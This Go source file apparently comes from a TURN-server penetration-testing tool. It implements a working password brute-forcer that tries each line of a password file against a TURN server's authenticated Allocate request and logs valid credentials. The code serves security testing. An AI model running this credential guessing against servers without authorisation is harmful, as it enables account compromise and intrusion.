package cmd

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/firefart/stunner/internal"
	"github.com/sirupsen/logrus"
)

type BruteforceOpts struct {
	TurnServer string
	Protocol   string
	Username   string
	Passfile   string
	UseTLS     bool
	Timeout    time.Duration
	Log        *logrus.Logger
}

func (opts BruteforceOpts) Validate() error {
	if opts.TurnServer == "" {
		return errors.New("need a valid turnserver")
	}
	if !strings.Contains(opts.TurnServer, ":") {
		return errors.New("turnserver needs a port")
	}
	if opts.Protocol != "tcp" && opts.Protocol != "udp" {
		return errors.New("protocol needs to be either tcp or udp")
	}
	if opts.Username == "" {
		return errors.New("please supply a username")
	}
	if opts.Passfile == "" {
		return errors.New("please supply a password file")
	}
	if opts.Log == nil {
		return errors.New("please supply a valid logger")
	}
	return nil
}

func BruteForce(ctx context.Context, opts BruteforceOpts) error {
	if err := opts.Validate(); err != nil {
		return err
	}

	pfile, err := os.Open(opts.Passfile)
	if err != nil {
		return fmt.Errorf("could not read password file: %w", err)
	}
	defer pfile.Close()

	scanner := bufio.NewScanner(pfile)
	for scanner.Scan() {
		if err := testPassword(ctx, opts, scanner.Text()); err != nil {
			return err
		}
	}

	if err := scanner.Err(); err != nil {
		return err
	}
	return nil
}

func testPassword(ctx context.Context, opts BruteforceOpts, password string) error {
	remote, err := internal.Connect(ctx, opts.Protocol, opts.TurnServer, opts.UseTLS, opts.Timeout)
	if err != nil {
		return err
	}

	addressFamily := internal.AllocateProtocolIgnore
	allocateRequest := internal.AllocateRequest(internal.RequestedTransportUDP, addressFamily)
	allocateResponse, err := allocateRequest.SendAndReceive(ctx, opts.Log, remote, opts.Timeout)
	if err != nil {
		return fmt.Errorf("error on sending AllocateRequest: %w", err)
	}
	if allocateResponse.Header.MessageType.Class != internal.MsgTypeClassError {
		return errors.New("MessageClass is not Error (should be not authenticated)")
	}

	realm := string(allocateResponse.GetAttribute(internal.AttrRealm).Value)
	nonce := string(allocateResponse.GetAttribute(internal.AttrNonce).Value)

	allocateRequest = internal.AllocateRequestAuth(opts.Username, password, nonce, realm, internal.RequestedTransportUDP, addressFamily)
	allocateResponse, err = allocateRequest.SendAndReceive(ctx, opts.Log, remote, opts.Timeout)
	if err != nil {
		return fmt.Errorf("error on sending AllocateRequest Auth: %w", err)
	}
	if allocateResponse.Header.MessageType.Class == internal.MsgTypeClassSuccess {
		opts.Log.Infof("Found valid credentials: %s:%s", opts.Username, password)
		return nil
	}
	// we got an error
	errorCode := allocateResponse.GetAttribute(internal.AttrErrorCode).Value[4:]
	if string(errorCode) != "Unauthorized" {
		// get all other errors than auth errors
		opts.Log.Errorf("Unknown error: %s", string(errorCode))
	}
	return nil
}
